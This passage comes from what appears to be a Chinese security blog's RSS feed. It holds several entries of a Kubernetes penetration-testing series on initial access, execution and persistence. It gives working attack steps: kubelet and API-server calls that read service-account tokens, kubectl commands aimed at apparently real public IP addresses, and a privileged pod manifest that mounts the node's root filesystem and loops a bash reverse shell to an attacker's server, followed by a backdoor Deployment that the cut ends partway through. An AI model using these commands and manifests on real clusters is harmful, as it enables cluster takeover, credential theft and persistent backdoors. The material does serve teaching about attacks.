tabindex=&#34;0&#34;&gt;&lt;code&gt;12:hugetlb:/kubepods/burstable/pod45226403-64fe-428d-a419-1cc1863c9148/e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;特权相关搜集&#34;&gt;特权相关搜集&lt;/h2&gt;&#xA;&lt;p&gt;另外&lt;code&gt;capsh --print&lt;/code&gt;获取到信息也较为重要，可以打印出当前容器里已有的 Capabilities 权限：&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751874769526.png&#34; alt=&#34;QQ_1751874769526&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;那如果没有capsh命令且无法安装怎么办呢？&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;首先&lt;code&gt;cat /proc/1/status&lt;/code&gt; 获取到 Capabilities hex 记录:&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751875341210.png&#34; alt=&#34;QQ_1751875341210&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;然后在我们自己安装了capsh的主机上进行decode：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751875475273.png&#34; alt=&#34;QQ_1751875475273&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;如此即可达到代替&lt;code&gt;capsh --print&lt;/code&gt;的效果&lt;/p&gt;</description>
    </item>
    <item>
      <title>K8s渗透-初始访问</title>
      <link>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/</link>
      <pubDate>Wed, 01 Jan 2025 00:00:00 +0800</pubDate>
      <guid>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/</guid>
      <description>&lt;h1 id=&#34;k8s渗透-初始访问&#34;&gt;K8s渗透-初始访问&lt;/h1&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;文章首发于track安全社区：&lt;a href=&#34;https://bbs.zkaq.cn/t/32483.html&#34;&gt;K8s渗透入门从零到一&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;初始访问是攻防矩阵的第一步，可以简单理解为获取对k8s的访问权限&lt;/p&gt;&#xA;&lt;h2 id=&#34;apiserver未授权&#34;&gt;APIServer未授权&lt;/h2&gt;&#xA;&lt;h3 id=&#34;insecure-port开启&#34;&gt;insecure-port开启&lt;/h3&gt;&#xA;&lt;p&gt;典中典的k8s相关漏洞，APIServer在集群中被用于提供API来控制集群内部，如果我们能控制API Server，就意味着我们可以通过它利用kubectl创建Pod并使用磁盘挂载技术获取Node节点控制权&lt;/p&gt;&#xA;&lt;p&gt;如果目标主机将APISevrer非安全端口8080暴露出来，便可以利用此端口进行对集群的攻击：&lt;/p&gt;&#xA;&lt;p&gt;直接访问8080端口，会返回可用的API列表：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751982848150.png&#34; alt=&#34;QQ_1751982848150&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来需要用到kubectl，安装教程见&lt;a href=&#34;https://kubernetes.io/zh-cn/docs/tasks/tools/install-kubectl-linux/?spm=a2c6h.12873639.article-detail.17.27ea1f40XfNqrj#install-using-native-package-management&#34;&gt;官网&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用kubectl可以获取集群信息：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl -s &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ip&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;port&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; get nodes&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384616909.png&#34; alt=&#34;QQ_1752384616909&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;上面这个案例可以看到有4个节点，其中有一个节点status为ready，可以成为后续执行阶段的入口点，比如利用kubectl调用该apiserver来创建恶意pod&lt;/p&gt;&#xA;&lt;h3 id=&#34;secure-port开启匿名访问&#34;&gt;secure-port开启匿名访问&lt;/h3&gt;&#xA;&lt;p&gt;即6443安全端口的未授权访问&lt;/p&gt;&#xA;&lt;p&gt;若我们不带任何凭证的访问 API server的 secure-port端口，默认会被服务器标记为&lt;code&gt;system:anonymous&lt;/code&gt;用户。&lt;/p&gt;&#xA;&lt;p&gt;一般来说&lt;code&gt;system:anonymous&lt;/code&gt;用户权限是很低的，但是如果运维人员管理失当，把&lt;code&gt;system:anonymous&lt;/code&gt;用户绑定到了&lt;code&gt;cluster-admin&lt;/code&gt;用户组，那么就意味着secure-port允许匿名用户以管理员权限向集群下达命令，这也算是变向的未授权了:&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426203178.png&#34; alt=&#34;QQ_1752426203178&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们可以通过kubectl进行apiserver调用：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kubectl -s https://112.126.76.224:6443 --insecure-skip-tls-verify=true cluster-info&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426404993.png&#34; alt=&#34;QQ_1752426404993&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;当然有可能会遇到这种情况：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426467047.png&#34; alt=&#34;QQ_1752426467047&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这种时候可以使用浏览器curl去请求api接口查看响应的json都能达到类似效果：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426612745.png&#34; alt=&#34;QQ_1752426612745&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;当然有个很好用的工具叫&lt;strong&gt;cdk&lt;/strong&gt;也可以实现，有个kcurl参数功能是连接K8s api-server发起自定义HTTP请求：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426961861.png&#34; alt=&#34;QQ_1752426961861&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在匿名用户可以未授权访问6443端口的情况，，我们可以尝试访问&lt;code&gt;/api/v1/namespaces/default/secret&lt;/code&gt;路由来尝试获取用户token：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754839911396.png&#34; alt=&#34;QQ_1754839911396&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们将这里的token字段进行base64解码后可以到到kubectl的6443安全端口进行操作，比如获取当前的权限：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl auth can-i --list --server&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;https://119.8.60.88:6443 --token&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;token值&amp;gt;&amp;#34;&lt;/span&gt; --insecure-skip-tls-verify&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752504397042.png&#34; alt=&#34;QQ_1752504397042&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这里可以看到权限非常高&lt;/p&gt;&#xA;&lt;p&gt;打法和不安全端口8080未授权类似，这里不再细说&lt;/p&gt;&#xA;&lt;h2 id=&#34;kubectl-proxy暴露&#34;&gt;kubectl proxy暴露&lt;/h2&gt;&#xA;&lt;p&gt;通过反向代理等方式进行端口转发将原本内网的未授权api server暴露到公网&lt;/p&gt;&#xA;&lt;p&gt;所以利用方式和apiserver未授权类似，这里不再细说&lt;/p&gt;&#xA;&lt;h2 id=&#34;kubelet未授权&#34;&gt;kubelet未授权&lt;/h2&gt;&#xA;&lt;p&gt;kubelet和kubectl的区别？&lt;/p&gt;&#xA;&lt;p&gt;kubelet是在Node上用于管理本机Pod的，kubectl是用于管理集群的。kubectl向集群下达指令，Node上的kubelet收到指令后以此来管理本机Pod&lt;/p&gt;&#xA;&lt;p&gt;每个节点都有一个kubelet服务，kubelet是在每个节点上运行的主要节点代理，监听了10250、10248、10255等端口，负责管理节点上的容器与master节点的通信，而10250端口就是kubelet与API Server进行通信的主要端口&lt;/p&gt;&#xA;&lt;p&gt;如果kubeconfig文件中的配置不当，则会导致系统存在kubelet未授权访问，在该情况下，攻击者能够列出当前运行的pod，对任意pod执行命令等，实现进一步的利用&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;例如对服务账号绑定了cluster-admin权限的pod执行命令来读取服务账号的token，然后利用高权限token控制apiserver，创建恶意pod并逃逸&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;通过请求接口执行命令读取token：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -XPOST -k &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;K8S&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:10250/run/&amp;lt;namespace&amp;gt;/&amp;lt;pod&amp;gt;/&amp;lt;container&amp;gt;&amp;#34;&lt;/span&gt; -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmd=cat /var/run/secret/kubernetes.io/serviceaccount/token&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;etcd未授权&#34;&gt;etcd未授权&lt;/h2&gt;&#xA;&lt;p&gt;k8s使用etcd存储数据，默认监听2379端口，如果该端口暴露到公网且存在未授权访问，就可能导致信息泄漏，攻击者可以通过收集到的凭证来尝试接管集群，而由于本机可免认证访问2379端口，所以可以结合SSRF来打组合拳&lt;/p&gt;</description>
    </item>
    <item>
      <title>K8s渗透-执行</title>
      <link>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%89%A7%E8%A1%8C/</link>
      <pubDate>Wed, 01 Jan 2025 00:00:00 +0800</pubDate>
      <guid>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%89%A7%E8%A1%8C/</guid>
      <description>&lt;h1 id=&#34;k8s渗透-执行&#34;&gt;K8s渗透-执行&lt;/h1&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;文章首发于track安全社区：&lt;a href=&#34;https://bbs.zkaq.cn/t/32483.html&#34;&gt;K8s渗透入门从零到一&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;执行阶段的主要任务是实现在集群内执行任意命令，获得shell&lt;/p&gt;&#xA;&lt;h2 id=&#34;kubectl-exec进入容器&#34;&gt;kubectl exec进入容器&lt;/h2&gt;&#xA;&lt;p&gt;当我们能够控制apiserver时，和docker类似，我们可以使用命令进入容器的shell中执行命令：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# apiserver未授权时&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl -s x.x.x.x:8080 --namespace&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;default exec -it test-rev -- bash&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 获取到kubeconfig文件时&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl --kubeconfig config --namespace&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;default exec -it test-rev -- bash&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 获取到高权限token时&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl --server&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;https://x.x.x.x:6443 --token&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;token值&amp;gt;&amp;#34;&lt;/span&gt; --insecure-skip-tls-verify --namespace&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;default exec -it test-rev -- bash&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;比如这里进入容器执行反弹shell命令&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755101935584.png&#34; alt=&#34;QQ_1755101935584&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;成功监听到反弹shell：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755101972156.png&#34; alt=&#34;QQ_1755101972156&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;创建后门pod&#34;&gt;创建后门pod&lt;/h2&gt;&#xA;&lt;p&gt;获取初始访问权限后，通过创建后门pod来执行后续攻击，&lt;/p&gt;&#xA;&lt;p&gt;首先本机上新建个yaml文件用于创建容器，将节点的根目录挂载到容器的 /mnt 目录，并在容器启动后自动执行反弹shell命令，内容如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Pod&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;test-rev&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;nodeName&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;&amp;lt;节点名称&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;containers&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;test-container&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ubuntu&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;command&lt;/span&gt;: [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;args&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      - |&lt;span style=&#34;color:#e6db74&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        apt update &amp;amp;&amp;amp; apt install -y bash netcat-openbsd &amp;amp;&amp;amp; \&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        bash -c &amp;#39;while true; do bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;你的vps的公网IP&amp;gt;/2333 0&amp;gt;&amp;amp;1; sleep 60; done&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;volumeMounts&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#f92672&#34;&gt;mountPath&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;/mnt&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;test-volume&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;securityContext&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;privileged&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;test-volume&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;hostPath&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;path&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后使用 kubectl 创建文件指定的恶意容器：&lt;/p&gt;</description>
    </item>
    <item>
      <title>K8s渗透-持久化</title>
      <link>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%8C%81%E4%B9%85%E5%8C%96/</link>
      <pubDate>Wed, 01 Jan 2025 00:00:00 +0800</pubDate>
      <guid>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%8C%81%E4%B9%85%E5%8C%96/</guid>
      <description>&lt;h1 id=&#34;k8s渗透-持久化&#34;&gt;K8s渗透-持久化&lt;/h1&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;文章首发于track安全社区：&lt;a href=&#34;https://bbs.zkaq.cn/t/32483.html&#34;&gt;K8s渗透入门从零到一&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;持久化即权限维持，通过持久化在k8s中留下后门，可以在初始访问的入口点丢掉之后仍然保持对k8s的控制权&lt;/p&gt;&#xA;&lt;h2 id=&#34;部署后门容器&#34;&gt;部署后门容器&lt;/h2&gt;&#xA;&lt;p&gt;在拥有了创建pod的权限后，我们就可以创建一个恶意的pod为我们实现权限维持（即在容器中留下shell），并且在pod中留下能控制node的后门（比如挂载node的根目录）&lt;/p&gt;&#xA;&lt;p&gt;常见方法如下&lt;/p&gt;&#xA;&lt;h3 id=&#34;挂载目录&#34;&gt;挂载目录&lt;/h3&gt;&#xA;&lt;p&gt;向创建的pod中挂载一些用于逃逸的目录，在我的逃逸相关文章详细记录了：&lt;a href=&#34;https://www.cnblogs.com/yuy0ung/articles/19054753&#34;&gt;K8s渗透-权限提升&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;这里值得一提的是，我们可以使用这个配置：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;restartPolicy&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Always&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以让pod在被关闭后重启&lt;/p&gt;&#xA;&lt;h3 id=&#34;使用k8s控制器部署后门容器&#34;&gt;使用k8s控制器部署后门容器&lt;/h3&gt;&#xA;&lt;p&gt;在前面 &lt;a href=&#34;&#34;&gt;K8s渗透-执行&lt;/a&gt; 的文章中，我们部署后门容器的方式是使用yaml文件，而文件中有这样一行：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Pod&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这代表我们创建的后门容器就是一个单纯的pod，而除此之外还有一类后门是控制器，它能自动创建和控制恶意pod，并且它也基于yaml文件创建，优点是更稳定，其自动创建的pod在被kill后可以被恢复，它的yaml文件格式如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;apps/v1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Deployment&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;test-rev&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;replicas&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;selector&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;matchLabels&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;app&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;test-rev&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;template&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span 